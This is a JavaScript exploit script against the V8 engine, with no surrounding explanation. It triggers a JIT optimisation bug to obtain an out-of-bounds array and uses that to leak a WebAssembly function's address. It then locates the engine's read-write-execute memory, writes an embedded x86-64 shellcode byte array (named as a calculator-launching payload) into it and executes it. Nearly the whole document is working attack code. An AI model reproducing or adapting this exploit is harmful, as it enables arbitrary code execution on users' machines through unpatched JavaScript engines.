class Memory{
	constructor(){
		this.buf = new ArrayBuffer(8);
		this.f64 = new Float64Array(this.buf);
		this.u32 = new Uint32Array(this.buf);
		this.bytes = new Uint8Array(this.buf);
	}
	d2u(val){				//double ==> Uint64
		this.f64[0] = val;
		let tmp = Array.from(this.u32);
		return tmp[1] * 0x100000000 + tmp[0];
	}
	u2d(val){				//Uint64 ==> double
		let tmp = [];
		tmp[0] = parseInt(val % 0x100000000);
		tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
		this.u32.set(tmp);
		return this.f64[0];
	}
}

var mem = new Memory();

function gc() { 
	for (var i = 0; i < 1024 * 1024 * 16; i++){
		new String();
	}
}

function log(x,y = ' '){
	console.log("[+] log:", x,y);   
}

function utf8ToString(h, p) {
	let s = "";
	for (i = p; h[i]; i++) {
		s += String.fromCharCode(h[i]);
	}
	return s;
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function exploit(){
	var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,1,10,143,128,128,128,0,1,137,128,128,128,0,0,65,1,16,0,26,65,42,11]);
	var wasmImports = {
		env: {
		puts: function puts (index) {
			console.log(utf8ToString(h, index));
		}
		}
	};
	let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
	let h = new Uint8Array(m.exports.memory.buffer);
	var f = m.exports.main;

	let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];

	let victim_obj = {x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9};
	let arr = [1.1,1.2,1.3,1.4,1.5,1.6];
	var OPT_NUM = 0x10000;

	function foo4vul(a,b,arr,o){
		for(let i=0;i<OPT_NUM;++i){}
		let ret = o.x+arr[4];
		a&b;
		o.l = 0x667788;
		return ret;
	}

	// trigger vul to get an OOB Array
	function trigger_vul(){
		let b0 = {
			valueOf: function(){
				return 22223333;
			}
		}
		let b = {
			valueOf: function(){
				victim_obj.__defineGetter__('xx',()=>2);
				victim_obj.__defineGetter__('xx',()=>2);
				for (var i = 0; i < 1024 * 1024 * 16; i++){
					new String();
				}
				return 888888889999;
			}
		}
		let arr_t = [1.1,1.2,1.3,1.4,1.5,1.6];
		foo4vul(12345,b0,arr_t,{x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9});
		foo4vul(12345,b0,arr_t,{x:1,y:2,z:3,l:4,a:5,b:6,c:7,d:8,e:9});
		foo4vul(12345,b,arr,victim_obj);
	}

	trigger_vul();

	marker = {a:0xdead,b:0xbeef,c:f};
	ab = new ArrayBuffer(0x222);
	gc();
	
	// find idx to arraybuffer/marker, leak wasm func's addr
	let idx = 0;
	let wasm_func_addr = 0;
	for(let i=0;i<400;++i){
		let tmp = arr[i];
		if(mem.d2u(tmp)==0xdead00000000){
			if(mem.d2u(tmp[i+1]=0xbeef00000000)){
				wasm_func_addr = mem.d2u(arr[i+2]);
				log('wasm func addr:',hex(wasm_func_addr));
				if(idx!=0){
					break;
				}
			}
		}
		else if(mem.d2u(tmp)==0x222){
			idx = i+1;
			log('idx to arraybuffer backing_store',idx);
			if(wasm_func_addr!=0){
				break;
			}
		}
	}
	if(idx==0 || wasm_func_addr==0){
		log('find idx failed!');
		return;
	}
	// read rwx's addr
	let dataview = new DataView(ab);
	arr[idx] = mem.u2d(wasm_func_addr-1+0x18);
	let SharedFunctionInfo_addr = mem.d2u(dataview.getFloat64(0,true));

	arr[idx] = mem.u2d(SharedFunctionInfo_addr+8-1);
	let WasmExportedFunctionData_addr = mem.d2u(dataview.getFloat64(0,true));

	arr[idx] = mem.u2d(WasmExportedFunctionData_addr+0x10-1);
	let data_instance_addr = mem.d2u(dataview.getFloat64(0,true));

	arr[idx] = mem.u2d(data_instance_addr-1+0xc8);
	let imported_function_targets = mem.d2u(dataview.getFloat64(0,true));

	arr[idx] = mem.u2d(imported_function_targets);
	let rwx_addr = mem.d2u(dataview.getFloat64(0,true));
	log('wasm rwx addr',hex(rwx_addr));
	
	// write shellcode
	arr[idx] = mem.u2d(rwx_addr);
	for(let i=0;i<shellcode_calc.length;++i){
		dataview.setUint8(i,shellcode_calc[i]);
	}
	f();
	
}

exploit();